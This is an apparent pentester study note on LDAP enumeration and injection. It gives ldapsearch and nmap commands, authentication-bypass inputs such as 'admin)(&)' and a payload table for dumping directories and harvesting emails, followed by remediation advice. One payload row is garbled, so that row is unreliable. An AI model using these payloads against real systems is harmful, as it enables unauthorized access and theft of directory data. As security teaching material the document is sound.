
# LDAP - Enumeration & Injection

## 🧠 Overview

LDAP is the "phonebook" of an organization. It is used to store, manage, and retrieve information about users, computers, and groups. In an enterprise environment, LDAP is almost always synonymous with **Active Directory**.

➡️ **Security Risk:** If an application doesn't sanitize user input before sending it to the LDAP server, attackers can manipulate the query logic to bypass logins or dump the entire corporate directory.

---

## 🔍 Enumeration & Information Gathering

### 🧪 Nmap Service Discovery

Identify if LDAP is exposed. In an internal network, this is often your first sign of a Domain Controller.

```bash
nmap -p 389,636 -sV --script ldap-search 10.10.10.10

```

### 🧪 The Power of `ldapsearch`

If "Anonymous Bind" is enabled (common in older or misconfigured systems), you can dump the directory without a password.

**Anonymous Query:**

```bash
ldapsearch -x -H ldap://10.10.10.10 -b "dc=inlanefreight,dc=local"

```

**Authenticated Query:**

```bash
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w "Password123" -b "dc=domain,dc=local" "(objectClass=user)"

```

---

## 💥 LDAP Injection: Deep Dive

### 🧩 Understanding LDAP Filter Syntax

LDAP uses **prefix notation** (Lisp-style).

* `(& (A) (B))` -> A AND B must be true.
* `(| (A) (B))` -> A OR B must be true.
* `(! (A))` -> A must be false.

### 🧪 Authentication Bypass Case Study

**Vulnerable Backend Code:**
`filter = "(&(uid=" + user + ")(userPassword=" + pass + "))"`

**Attack 1: The Wildcard Bypass**

* **Input:** `admin` | `*`
* **Resulting Filter:** `(&(uid=admin)(userPassword=*))`
* **Logic:** Matches the admin user with *any* password.

**Attack 2: Logical Operator Injection**

* **Input:** `admin)(&)` | `anything`
* **Resulting Filter:** `(&(uid=admin)(&))(userPassword=anything))`
* **Logic:** The LDAP parser processes the first complete statement `(&(uid=admin)(&))`. Since `(&)` is always true, the login succeeds regardless of the password part.

---

## 🚀 Advanced Injection Payloads

| Payload | Goal | Why it works |
| --- | --- | --- |
| `*` | **Field Discovery** | Reveals if a field exists and has a value. |
| `admin*)( | (password=*))` | **Auth Bypass** |
| `*)(objectClass=*` | **Data Dump** | Attempts to break out and list all objects in the class. |
| `(mail=*)` | **Email Harvesting** | Forces the application to return all users with an email. |

---

## 🛡️ Defensive Measures (Remediation)

1. **Escaping User Input:** Sanitize all special characters: `( ) & | < > = ; * /`.
2. **Parameterized Queries:** Use LDAP libraries that support parameterized searching (similar to Prepared Statements in SQL).
3. **Disable Anonymous Binds:** Ensure the LDAP server requires authentication for any query.
4. **Principle of Least Privilege:** The service account used by the web app should only have read access to specific OUs (Organizational Units), not the whole tree.

---

## 💣 Pentester Mindset

* **The "Error" Lead:** If you input a `*` or a `)` and the app returns a "Server Error" or "Filter Error", you have a confirmed injection point.
* **Blind LDAP Injection:** Similar to Blind SQLi, if there is no output, you can use "time-based" injections or "boolean" tests (e.g., testing character by character: `admin)(uid=a*`).
* **Beyond Users:** LDAP stores everything. Search for `description` or `info` fields; admins often leave service passwords or notes there.
